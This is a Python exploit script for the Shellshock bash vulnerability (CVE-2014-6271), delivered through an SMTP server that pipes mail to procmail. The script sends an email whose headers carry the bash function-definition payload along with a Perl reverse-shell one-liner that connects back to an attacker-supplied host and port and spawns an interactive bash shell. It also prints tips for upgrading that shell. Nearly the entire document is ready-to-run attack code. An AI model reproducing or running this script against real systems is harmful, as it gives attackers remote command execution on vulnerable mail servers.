#!/usr/bin/env python3

# Exploit Title:  Shellshock SMTP Exploit
# Modified on: 5/20/2022
# Modified by: grav3m1nd-byte
#
# Originally Developed:
# Date: 10/3/2014
# Exploit Author: fattymcwopr
#
# Vendor Homepage: gnu.org
# Software Link: http://ftp.gnu.org/gnu/bash/
# Version: 4.2.x < 4.2.48
# Tested on: Debian 7 (postfix smtp server w/procmail)
# CVE : 2014-6271

from socket import *
import sys
import codecs
import argparse


def netFormat(d):
    d += "\r\n"
    return d.encode()

parser = argparse.ArgumentParser(description='Shellshock SMTP Exploit')
parser.add_argument('-r', '--RHOST', required=True, type=str,
    help="Remote Host to connect to against its SMTP Service")
parser.add_argument('-rp', '--RPORT', required=False, default=25, type=int,
    help="Remote Port SMTP Service")

parser.add_argument('-l', '--LHOST', required=True, type=str,
    help='Local Host to be used for the reverse shell')
parser.add_argument('-lp', '--LPORT', required=True, type=int,
    help='Local Port to listed to for the reverse shell')

parser.add_argument('--TO', required=True, type=str,
    help='Recipient Email Address as validated with the SMTP Service')
parser.add_argument('--FROM', required=False, default='nobody', type=str,
    help='Sender email address')

args = parser.parse_args()

cmd =  '''perl -e 'use Socket;$i="'''
cmd += args.LHOST + '''";$p=''' + str(args.LPORT)
cmd += ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'''
cmd += '''{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' '''

print(
    '''Shellshock SMTP Exploit:
    Victim Machine:     {0}
    Service Port:       {1}
    Attacker:           {2}
    Reverse Shell Port: {3}
    User Email:         {4}
    '''.format(args.RHOST, args.RPORT, args.LHOST, args.LPORT, args.TO)
)

print("[!]  Make sure you have a listener on port {}!".format(args.LPORT))
print('''[!]  For interactive shell, use:
    python(3) -c 'import pty;pty.spawn("/bin/bash")'
    stty raw -echo
    export TERM=xterm ''')

headers = ([
    "To",
    "References",
    "Cc",
    "Bcc",
    "From",
    "Subject",
    "Date",
    "Message-ID",
    "Comments",
    "Keywords",
    "Resent-Date",
    "Resent-From",
    "Resent-Sender"
    ])

print("\n[*]    Sending Email Data...")
s = socket(AF_INET, SOCK_STREAM)
s.connect((args.RHOST, args.RPORT))

# banner grab
s.recv(2048*4)

data = netFormat("mail from:<{0}>".format(args.FROM))
s.send(data)
s.recv(2048*4)
print(data)

data = netFormat("rcpt to:<{0}>".format(args.TO))
s.send(data)
s.recv(2048*4)
print(data)

print("\n[*]   Sending Payload...")
data = netFormat("data")
s.send(data)
s.recv(2048*4)
print(data)

data = b''
for header in headers:
    data += netFormat(header + ":() { :; };" + cmd)
data += netFormat(cmd)

# <CR><LF>.<CR><LF>
data += codecs.decode("0d0a2e0d0a", 'hex')

s.send(data)
s.recv(2048*4)
print(data)

data = netFormat("quit")
s.send(data)
s.recv(2048*4)
print("{}\n".format(data))
